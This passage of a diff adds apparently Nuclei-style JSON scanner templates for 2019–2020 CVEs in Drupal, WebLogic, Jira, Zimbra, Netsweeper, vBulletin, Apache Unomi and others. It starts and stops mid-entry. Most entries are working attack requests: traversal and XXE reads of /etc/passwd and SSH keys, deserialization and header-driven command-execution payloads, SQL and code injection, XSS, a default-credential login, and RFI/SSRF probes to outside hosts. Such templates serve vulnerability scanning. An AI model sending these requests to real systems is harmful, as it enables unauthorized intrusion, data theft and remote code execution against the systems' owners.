+            "{{BaseURL}}/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-5418",
+      "info": {
+        "author": "omarkurt",
+        "name": "File Content Disclosure on Rails",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Accept": "../../../../../../../../etc/passwd{{"
+          },
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-6112",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "WordPress Plugin Sell Media v2.4.1 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "id=\"sell-media-search-text\" class=\"sell-media-search-text\"",
+                "alert(1337)"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/sell-media-search/?keyword=%22%3E%3Cscript%3Ealert%281337%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-6340",
+      "info": {
+        "author": "madrobot",
+        "description": "Some field types do not properly sanitize data from non-form sources in Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10. This can lead to arbitrary PHP code execution in some cases.",
+        "name": "Drupal 8 core RESTful Web Services RCE",
+        "product": "Drupal",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-6340",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "{ \"link\": [ { \"value\": \"link\", \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:2:\\\"id\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\" } ], \"_links\": { \"type\": { \"href\": \"http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default\" } } }",
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "uid=",
+                "gid="
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/node/1?_format=hal_json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-6715",
+      "info": {
+        "author": "randomrobbie",
+        "description": "W3 Total Cache 0.9.2.6-0.9.3 - Unauthenticated Arbitrary File Read / SSRF",
+        "name": "CVE-2019-6715",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "TmVzc3VzQ29kZUV4ZWNUZXN0"
+              ]
+            }
+          ],
+          "raw": [
+            "PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36\nContent-Length: 124\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n{\"Type\":\"SubscriptionConfirmation\",\"Message\":\"\",\"SubscribeURL\":\"https://rfi.nessus.org/rfi.txt\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-7256",
+      "info": {
+        "author": "pikpikcu",
+        "name": "eMerge E3 1.00-06 - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n",
+            "GET /nuclei.txt HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-7609",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "Kibana Timelion Arbitrary Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "{\"sheet\":[\".es(*)\"],\"time\":{\"from\":\"now-1m\",\"to\":\"now\",\"mode\":\"quick\",\"interval\":\"auto\",\"timezone\":\"Asia/Shanghai\"}}",
+          "headers": {
+            "Content-Type": "application/json; charset=utf-8",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "seriesList"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: application/json"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/api/timelion/run",
+            "{{BaseURL}}:5601/api/timelion/run"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-8442",
+      "info": {
+        "author": "Kishore Krishna (siLLyDaddy)",
+        "name": "JIRA Directory Traversal",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<groupId>com.atlassian.jira</groupId>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-8449",
+      "info": {
+        "author": "Harsh Bothra",
+        "name": "JIRA Unauthenticated Sensitive Information Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "{\"users\":{\"users\":"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-8451",
+      "info": {
+        "author": "TechbrunchFR",
+        "name": "JIRA SSRF in the /plugins/servlet/gadgets/makeRequest resource",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "headers": {
+            "X-Atlassian-token": "no-check"
+          },
+          "matchers": [
+            {
+              "name": "ssrf-response-body",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<p>This domain is for use in illustrative examples in documents."
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/servlet/gadgets/makeRequest?url=https://{{Hostname}}:1337@example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-8903",
+      "info": {
+        "author": "madrobot",
+        "name": "Totaljs - Unathenticated Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "apache2.conf"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-8982",
+      "info": {
+        "author": "madrobot",
+        "name": "Wavemaker Studio 6.6 LFI/SSRF",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-9670",
+      "info": {
+        "author": "ree4pwn",
+        "description": "mailboxd component in Synacor Zimbra Collaboration Suite 8.7.x before 8.7.11p10 has an XML External Entity injection (XXE) vulnerability.",
+        "name": "Zimbra Collaboration XXE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            }
+          ],
+          "raw": [
+            "POST /Autodiscover/Autodiscover.xml HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/xml\n\n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\n<Request>\n<EMailAddress>aaaaa</EMailAddress>\n<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n</Request>\n</Autodiscover>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-9733",
+      "info": {
+        "author": "akshansh",
+        "name": "Artifactory Access-Admin Login Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"username\": \"access-admin\""
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /artifactory/ui/auth/login?_spring_security_remember_me=false HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 60\nAccept: application/json, text/plain, */*\nX-Requested-With: artUI\nserial: 58\nX-Forwarded-For: 127.0.0.1\nRequest-Agent: artifactoryUI\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36\nContent-Type: application/json\nOrigin: http://{{Hostname}}\nReferer: http://{{Hostname}}/artifactory/webapp/\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n{\"user\":\"access-admin\",\"password\":\"password\",\"type\":\"login\"}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-9978",
+      "info": {
+        "author": "madrobot & dwisiswant0",
+        "name": "WordPress social-warfare RFI",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Burp Collabolator Server"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://burpcollaborator.net"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-0618",
+      "info": {
+        "author": "joeldeleep",
+        "name": "RCE in SQL Server Reporting Services",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "view report"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ReportServer/Pages/ReportViewer.aspx"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-10199",
+      "info": {
+        "auhtor": "hetroublemakr",
+        "description": "Sonatype Nexus Repository before 3.21.2 allows JavaEL Injection (issue 1 of 2).",
+        "name": "Nexus Repository Manager 3 RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "body": "{\"name\": \"internal\",\"online\": true,\"storage\": {\"blobStoreName\": \"default\",\"strictContentTypeValidation\": true},\"group\": {\"memberNames\": [\"$\\\\c{ 1337 * 1337 }\"]}}",
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "1787569"
+              ]
+            },
+            {
+              "status": [
+                400
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/rest/beta/repositories/go/group"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-10204",
+      "info": {
+        "auhtor": "hetroublemakr",
+        "description": "A Remote Code Execution vulnerability has been discovered in Nexus Repository Manager requiring immediate action. The vulnerability allows for an attacker with an administrative account on NXRM to execute arbitrary code by crafting a malicious request to NXRM",
+        "name": "Sonatype Nexus Repository RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "body": "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"anonymous\",\"version\":\"1\",\"firstName\":\"Anonymous\",\"lastName\":\"User2\",\"email\":\"anonymous@example.org\",\"status\":\"active\",\"roles\":[\"$\\\\c{1337*1337\"]}],\"type\":\"rpc\",\"tid\":28}",
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "1787569"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/extdirect"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-11034",
+      "info": {
+        "author": "pikpikcu",
+        "name": "GLPI v.9.4.6 - Open redirect",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "regex": [
+                "(?m)^(?:Location\\s*?:\\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\\-_]*\\.)?evil\\.com(?:\\s*?)$"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?redirect=/\\/evil.com/",
+            "{{BaseURL}}/index.php?redirect=//evil.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-1147",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "RCE at SharePoint Server (.NET Framework & Visual Studio) detection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "List does not exist",
+                "It may have been deleted by another user"
+              ]
+            },
+            {
+              "condition": "or",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Microsoft-IIS",
+                "X-SharePointHealthScore",
+                "SharePointError",
+                "SPRequestGuid",
+                "MicrosoftSharePointTeamServices"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/_layouts/15/listform.aspx?PageType=1&ListId=%7B13371337-1337-1337-1337-133713371337%7D"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-12116",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Zoho ManageEngine OpManager Stable build before 124196 and Released build before 125125 allows an unauthenticated attacker to read arbitrary files on the server by sending a crafted request.",
+        "name": "Unauthenticated Zoho ManageEngine OpManger Arbitrary File Read",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "internal": true,
+              "name": "endpoint",
+              "part": "body",
+              "regex": [
+                "(?m)/cachestart/.*/jquery/"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "BEGIN RSA PRIVATE KEY"
+              ]
+            }
+          ],
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: close\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}:8060\nAccept: */*\nConnection: close\n",
+            "GET endpoint../../../../bin/.ssh_host_rsa_key HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nCache-Control: max-age=0\nConnection: close\nReferer: http://{{Hostname}}\n",
+            "GET endpoint../../../../bin/.ssh_host_rsa_key HTTP/1.1\nHost: {{Hostname}}:8060\nAccept: */*\nCache-Control: max-age=0\nConnection: close\nReferer: http://{{Hostname}}:8060/\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-12720",
+      "info": {
+        "author": "pdnuclei - projectdiscovery.io",
+        "description": "vBulletin before 5.5.6pl1, 5.6.0 before 5.6.0pl1, and 5.6.1 before 5.6.1pl1 has incorrect access control.",
+        "name": "CVE-2020-12720 vBulletin SQLI",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "vbulletinrce"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /ajax/api/content_infraction/getIndexableContent HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: keep-alive\nX-Requested-With: XMLHttpRequest\nContent-Length: 218\nContent-Type: application/x-www-form-urlencoded\n\nnodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-13167",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.",
+        "name": "Netsweeper WebAdmin unixlogin.php Python Code Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Connection": "close",
+            "Referer": "http://{{Hostname}}/webadmin/admin/service_manager_data.php",
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "nonexistent"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5",
+            "{{BaseURL}}/webadmin/out"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-13942",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Remote Code Execution in Apache Unomi.\nApache Unomi allows conditions to use OGNL and MVEL scripting which\noffers the possibility to call static Java classes from the JDK\nthat could execute code with the permission level of the running Java process.\nThis vulnerability affects all versions of Apache Unomi prior to 1.5.2. Apache Unomi users should upgrade to 1.5.2 or later.\n\nReferences:\n- https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/\n- https://twitter.com/chybeta/status/1328912309440311297\n",
+        "name": "Apache Unomi Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "{\n  \"filters\": [\n    {\n      \"id\": \"nuclei\",\n      \"filters\": [\n        {\n          \"condition\": {\n            \"parameterValues\": {\n              \"nuclei\": \"script::Runtime.getRuntime().exec('id')\"\n            },\n            \"type\": \"profilePropertyCondition\"\n          }\n        }\n      ]\n    }\n  ],\n  \"sessionId\": \"nuclei\"\n}\n",
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json",
+                "context-profile-id"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "regex": [
+                "(profile|session)(Id|Properties|Segments)",
+                "[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/context.json",
+            "{{BaseURL}}:8181/context.json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-14179",
+      "info": {
+        "author": "x1m_martijn",
+        "description": "Affected versions of Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint. The affected versions are before version 8.5.8, and from version 8.6.0 before 8.11.1.",
+        "name": "Sensitive data exposure via insecure Jira endpoint",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "searchers",
+                "groups"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/secure/QueryComponent!Default.jspa"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-14181",
+      "info": {
+        "author": "bjhulst",
+        "description": "Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. The affected versions are before version 7.13.6, from version 8.0.0 before 8.5.7, and from version 8.6.0 before 8.12.0.",
+        "name": "User enumeration via insecure Jira endpoint",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "User does not exist"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/secure/ViewUserHover.jspa"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-14815",
+      "info": {
+        "author": "shine",
+        "name": "Oracle Fusion Middleware XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<svg/onload=alert(document.domain)>"
+              ]
+            },
+            {
+              "negative": true,
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/bi-security-login/login.jsp?msi=false&redirect=\"><svg/onload=alert(document.domain)>"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-14864",
+      "info": {
+        "author": "Ivo Palazzolo (@palaziv)",
+        "description": "Oracle Business Intelligence Enterprise Edition 5.5.0.0.0 / 12.2.1.3.0 / 12.2.1.4.0 - \"getPreviewImage\" Directory Traversal/Local File Inclusion",
+        "name": "Oracle Fusion - \"getPreviewImage\" Directory Traversal/Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "cookie-reuse": true,
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
+          },
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/analytics/saw.dll?bieehome&startPage=1",
+            "{{BaseURL}}/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-14882",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Vulnerability in the Oracle WebLogic Server\nproduct of Oracle Fusion Middleware (component: Console).\nSupported versions that are affected are 10.3.6.0.0,\n12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0.\nEasily exploitable vulnerability allows unauthenticated\nattacker with network access via HTTP to compromise the server.\nSuccessful attacks of this vulnerability can result in takeover.\n",
+        "name": "Oracle WebLogic Server Unauthenticated RCE (and Patch Bypass)",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:",
+                "\\[(font|extension|file)s\\]"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "payloads": {
+            "exec": [
+              "type C:\\Windows\\win.ini",
+              "cat /etc/passwd"
+            ]
+          },
+          "raw": [
+            "POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1\nHost: {{Hostname}}\ncmd: §exec§\nConnection: close\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\n_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession%28%22var%20m%20%3D%20java.lang.Class.forName%28%22weblogic.work.ExecuteThread%22%29.getDeclaredMethod%28%22getCurrentWork%22%29%3B%20var%20currThread%20%3D%20java.lang.Thread.currentThread%28%29%3B%20var%20currWork%20%3D%20m.invoke%28currThread%29%3B%20var%20f2%20%3D%20currWork.getClass%28%29.getDeclaredField%28%22connectionHandler%22%29%3B%20f2.setAccessible%28true%29%3B%20var%20connectionHandler%20%3D%20f2.get%28currWork%29%3B%20var%20f3%20%3D%20connectionHandler.getClass%28%29.getDeclaredField%28%22request%22%29%3B%20f3.setAccessible%28true%29%3B%20var%20request%20%3D%20f3.get%28connectionHandler%29%3B%20var%20command%20%3D%20request.getHeader%28%22cmd%22%29%3B%20var%20response%20%3D%20request.getResponse%28%29%3B%20var%20isWin%20%3D%20java.lang.System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%3B%20var%20listCmd%20%3D%20new%20java.util.ArrayList%28%29%3B%20var%20p%20%3D%20new%20java.lang.ProcessBuilder%28%22%22%29%3B%20if%28isWin%29%7Bp.command%28%22cmd.exe%22%2C%20%22%2Fc%22%2C%20command%29%3B%20%7Delse%7Bp.command%28%22%2Fbin%2Fbash%22%2C%20%22-c%22%2C%20command%29%3B%20%7D%20p.redirectErrorStream%28true%29%3B%20var%20process%20%3D%20p.start%28%29%3B%20var%20output%20%3D%20process.getInputStream%28%29%3B%20var%20scanner%20%3D%20new%20java.util.Scanner%28output%29.useDelimiter%28%22%5C%5C%5C%5CA%22%29%3B%20var%20out%20%3D%20scanner.next%28%29%3B%20var%20outputStream%20%3D%20response.getServletOutputStream%28%29%3B%20outputStream.write%28out.getBytes%28%29%29%3B%20outputStream.flush%28%29%3B%20response.getWriter%28%29.write%28%22%22%29%3B%20currThread.interrupt%28%29%3B%22%29\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-15129",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "There exists a potential open redirect vulnerability in Traefik's handling of the X-Forwarded-Prefix header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team may want to address this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.",
+        "name": "Open-redirect in Traefik",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "headers": {
+            "X-Forwarded-Prefix": "https://foo.nl"
+          },
+          "matchers": [
+            {
+              "status": [
+                302
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "or",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<a href=\"https://foo.nl/dashboard/\">Found</a>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}",
+            "{{BaseURL}}:8081"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-15505",
+      "info": {
+        "author": "dwisiswant0",
+        "name": "RCE in MobileIron Core & Connector <= v10.6 & Sentry <= v9.8",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/x-hessian"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
